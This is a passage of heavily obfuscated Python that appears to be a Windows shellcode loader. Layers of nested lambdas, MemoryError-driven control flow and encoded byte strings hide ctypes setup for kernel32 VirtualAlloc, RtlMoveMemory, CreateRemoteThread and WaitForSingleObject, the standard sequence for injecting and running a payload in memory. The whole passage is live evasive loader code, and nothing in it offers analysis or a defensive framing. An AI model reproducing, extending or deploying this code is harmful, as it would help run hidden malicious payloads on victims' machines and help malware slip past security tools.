                raise MemoryError([(lambda: (lambda _139: _139 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1916 = [[(lambda: (lambda _618: _618 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _127: _127 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _611: _611 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _193:
        __2209966919595 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '215' == '115':
        case True:
            raise MemoryError([True])
        case False:
            _149 = [[True], [False]]
            R_E_D__A_V______(['_92'])
    raise MemoryError([True])
except MemoryError as _73:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _312: _312 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _123 = [[(lambda: (lambda _173: _173 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _212: _212 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _1812: _1812 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _109:
        try:
            raise MemoryError(__2209966919595)
        except MemoryError as __6478231950534:
            if __6478231950534.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.restype = wt.LPVOID
            if __6478231950534.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __4249605560512 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xb8\xf0\x07J\x19\xd4'))()
            if __6478231950534.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6496194048608 = (lambda: R_E_D__A_V(b'R_E_D__A_V__!J\nJ=\x97'))()
try:
    match '95' == '119':
        case True:
            raise MemoryError([True])
        case False:
            _812 = [[True], [False]]
            R_E_D__A_V______(['_173'])
    raise MemoryError([True])
except MemoryError as _415:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _133: _133 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _171 = [[(lambda: (lambda _45: _45 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _213: _213 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _193: _193 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _117:
        __3875394401563 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '48' == '36':
        case True:
            raise MemoryError([True])
        case False:
            _1017 = [[True], [False]]
            R_E_D__A_V______(['_315'])
    raise MemoryError([True])
except MemoryError as _216:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _515: _515 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _187 = [[(lambda: (lambda _1017: _1017 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _212: _212 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _57: _57 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _107:
        __3875394401563 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '112' == '217':
        case True:
            raise MemoryError([True])
        case False:
            _144 = [[True], [False]]
            R_E_D__A_V______(['_1015'])
    raise MemoryError([True])
except MemoryError as _64:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _118: _118 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _89 = [[(lambda: (lambda _917: _917 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1219: _1219 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _36: _36 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1013:
        try:
            raise MemoryError(__3875394401563)
        except MemoryError as __5480250225656:
            if __5480250225656.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
            if __5480250225656.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6862633544964 = (lambda: R_E_D__A_V(b'R_E_D__A_V__b\x82k\xea\xa9\x91'))()
            if __5480250225656.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2385321816031 = (lambda: R_E_D__A_V(b'R_E_D__A_V__*e\x93\xbf]W'))()
try:
    match '141' == '158':
        case True:
            raise MemoryError([True])
        case False:
            _133 = [[True], [False]]
            R_E_D__A_V______(['_112'])
    raise MemoryError([True])
except MemoryError as _102:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _51: _51 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _103 = [[(lambda: (lambda _310: _310 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _87: _87 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _813: _813 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _182:
        __7604731457966 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '114' == '69':
        case True:
            raise MemoryError([True])
        case False:
            _1915 = [[True], [False]]
            R_E_D__A_V______(['_1312'])
    raise MemoryError([True])
except MemoryError as _19:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _919: _919 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _185 = [[(lambda: (lambda _145: _145 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1511: _1511 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _54: _54 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1817:
        __7604731457966 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1615' == '159':
        case True:
            raise MemoryError([True])
        case False:
            _198 = [[True], [False]]
            R_E_D__A_V______(['_110'])
    raise MemoryError([True])
except MemoryError as _87:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742709, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1317: _1317 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1216 = [[(lambda: (lambda _414: _414 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1516: _1516 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _917: _917 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _186:
        try:
            raise MemoryError(__7604731457966)
        except MemoryError as __6372721501360:
            if __6372721501360.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.CreateRemoteThread.restype = wt.HANDLE
            if __6372721501360.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __6262209171385 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xb0\xbc\xe1g\x95\xf0'))()
            if __6372721501360.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __5909091658600 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xd7Q\xf1\xb3C\t'))()
            if __6372721501360.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __7564599982431 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xb8\x00\xffn\x03\xd9'))()
            if __6372721501360.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __2673060929776 = (lambda: R_E_D__A_V(b'R_E_D__A_V__aH\xdf\xdb\xa9J'))()
            if __6372721501360.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
                __6766108314751 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x15\xf2>X,\xf0'))()
try:
    match '71' == '25':
        case True:
            raise MemoryError([True])
        case False:
            _36 = [[True], [False]]
            R_E_D__A_V______(['_1714'])
    raise MemoryError([True])
except MemoryError as _211:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742705]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _119: _119 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _611 = [[(lambda: (lambda _76: _76 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _118: _118 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742711]))))())())()])
        raise MemoryError([(lambda: (lambda _177: _177 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1916:
        __8478357878834 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '59' == '114':
        case True:
            raise MemoryError([True])
        case False:
            _166 = [[True], [False]]
            R_E_D__A_V______(['_1114'])
    raise MemoryError([True])
except MemoryError as _1413:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _159: _159 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _810 = [[(lambda: (lambda _61: _61 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _127: _127 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704, 16742707]))))())())()])
        raise MemoryError([(lambda: (lambda _419: _419 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1719:
        __8478357878834 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '511' == '313':
        case True:
            raise MemoryError([True])
        case False:
            _96 = [[True], [False]]
            R_E_D__A_V______(['_167'])
    raise MemoryError([True])
except MemoryError as _67:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1015: _1015 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _613 = [[(lambda: (lambda _1117: _1117 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1614: _1614 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _1819: _1819 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _510:
        try:
            raise MemoryError(__8478357878834)
        except MemoryError as __3542459059714:
            if __3542459059714.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
            if __3542459059714.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5301770412039 = (lambda: R_E_D__A_V(b'R_E_D__A_V__1\xa2\x94\xa9\xd2\xbf'))()
            if __3542459059714.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2748110070759 = (lambda: R_E_D__A_V(b'R_E_D__A_V__a\xa8)\x90\xfd\x99'))()
try:
    match '1910' == '812':
        case True:
            raise MemoryError([True])
        case False:
            _65 = [[True], [False]]
            R_E_D__A_V______(['_71'])
    raise MemoryError([True])
except MemoryError as _18:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _319: _319 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1019 = [[(lambda: (lambda _155: _155 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1318: _1318 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742703, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _61: _61 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _16:
        __3922251463428 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '813' == '112':
        case True:
            raise MemoryError([True])
        case False:
            _38 = [[True], [False]]
            R_E_D__A_V______(['_118'])
    raise MemoryError([True])
except MemoryError as _67:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _164: _164 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _115 = [[(lambda: (lambda _115: _115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _103: _103 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742705, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _114: _114 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _174:
        __3922251463428 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '114' == '817':
        case True:
            raise MemoryError([True])
        case False:
            _1715 = [[True], [False]]
            R_E_D__A_V______(['_1413'])
    raise MemoryError([True])
except MemoryError as _87:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1311: _1311 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _37 = [[(lambda: (lambda _1619: _1619 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _117: _117 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742704, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1810: _1810 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _86:
        try:
            raise MemoryError(__3922251463428)
        except MemoryError as __8116151573469:
            if __8116151573469.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.RtlMoveMemory.restype = None
            if __8116151573469.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __7543204388893 = (lambda: R_E_D__A_V(b'R_E_D__A_V__w(*\xa6\xda|'))()
            if __8116151573469.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6826796749187 = (lambda: R_E_D__A_V(b'R_E_D__A_V__C\x15\xd7~\xa8\xd6'))()
try:
    match '155' == '415':
        case True:
            raise MemoryError([True])
        case False:
            _159 = [[True], [False]]
            R_E_D__A_V______(['_27'])
    raise MemoryError([True])
except MemoryError as _128:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1311: _1311 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _177 = [[(lambda: (lambda _49: _49 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1615: _1615 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda: (lambda _92: _92 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _719:
        __5370491094803 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '64' == '126':
        case True:
            raise MemoryError([True])
        case False:
            _157 = [[True], [False]]
            R_E_D__A_V______(['_1314'])
    raise MemoryError([True])
except MemoryError as _1416:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _32: _32 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _49 = [[(lambda: (lambda _1110: _1110 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _185: _185 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742711, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _1610: _1610 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _614:
        __5370491094803 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1119' == '211':
        case True:
            raise MemoryError([True])
        case False:
            _715 = [[True], [False]]
            R_E_D__A_V______(['_1614'])
    raise MemoryError([True])
except MemoryError as _197:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1317: _1317 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1211 = [[(lambda: (lambda _116: _116 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1916: _1916 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742708]))))())())()])
        raise MemoryError([(lambda: (lambda _1619: _1619 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _215:
        try:
            raise MemoryError(__5370491094803)
        except MemoryError as __3296165152902:
            if __3296165152902.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
            if __3296165152902.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __5140545119091 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x134\xed\xa5\x13F'))()
            if __3296165152902.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6696780053823 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x84\x93\xe0\xcf \xbc'))()
            if __3296165152902.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __6738154004997 = (lambda: R_E_D__A_V(b'R_E_D__A_V__-\x99\xe2\xb7\x88\xf5'))()
try:
    match '1915' == '92':
        case True:
            raise MemoryError([True])
        case False:
            _138 = [[True], [False]]
            R_E_D__A_V______(['_817'])
    raise MemoryError([True])
except MemoryError as _1215:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1214: _1214 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _72 = [[(lambda: (lambda _199: _199 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _181: _181 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742704, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _1514: _1514 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1110:
        __4284648125815 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '113' == '314':
        case True:
            raise MemoryError([True])
        case False:
            _29 = [[True], [False]]
            R_E_D__A_V______(['_187'])
    raise MemoryError([True])
except MemoryError as _183:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _158: _158 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _412 = [[(lambda: (lambda _1611: _1611 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _415: _415 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
